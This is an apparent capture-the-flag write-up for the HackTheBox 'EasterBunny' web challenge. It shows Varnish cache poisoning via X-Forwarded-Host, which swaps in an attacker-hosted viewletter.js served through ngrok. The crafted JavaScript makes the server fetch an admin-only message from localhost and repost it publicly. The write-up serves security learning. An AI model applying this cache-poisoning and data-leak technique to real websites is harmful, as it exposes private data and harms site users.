#  EasterBunny HTB Challenge 

__________________________________________

# EasterBunny

This challenge is about **cache poisoning** vulnerability.

We can write a message to our beloved easter bunny and, if we navigate through the id's in /message/ID or /letters?id=ID there are all the various messages left. 

We can notice that The 3rd message is not reachable and it's the one where the flag is hidden.
If only we were admin we could read the hidden message!!

```js
const isAdmin = (req, res) => {
  return req.ip === '127.0.0.1' && req.cookies['auth'] === authSecret;
};
```

There's a way to do it.
**What if the admin will read it for us and it will repost the hidden message in a new letter?**

### Varnish Cache

Intercept with burpsuite, and the response will show that the server is using **varnish cache**

>Cache are used basically to improve user experience reducing the load on the server and improve the performance of the website storing and serving content that are previously fetched

We know that the server is hitting the cache because in the response we see cache: HIT or MISS
If we add the header X-Forwarded-Host we can reach and hit the cache.

Whenever we send a new message, the server is getting a js file stored in **/static/viewletter.js**.

## Vulnerability and Exploit

We can craft our own viewletter.js file, store locally in a /static/ folder and trick the cache to get our js file instead the one from its server.

The JS script will fetch the hidden message and it will submit the response in a new message from its localhost.
#### crafted viewletter.js

```js
  fetch("http://127.0.0.1/message/3").then((r) => {
    return r.text();
  }).then((x) => {
    fetch("http://127.0.0.1/submit", {
      "headers": {
        "content-type": "application/json"
      },
      "body": x,
      "method": "POST",
    });
  });

```

The script will fetch the /message/3 from the server as it is asking from itself bypassing the "isAdmin" function: then it will submit a new message with the body text taken from the 3rd message

# Exploit steps

1. Make a new folder and name it static `mkdir static`
2. Save the evil **viewletter.js** inside "static" folder
3. Open a ngrok server and a python http.server
4. Intercept a request with Burpsuite made to the endpoint **/letters?id=10** replacing the host with 127.0.0.1 and adding X-Forwarded-Host with the ngrok url.
4. After we get the response, post a new message, navigate to the new message created and we will see the hidden message with the flag!

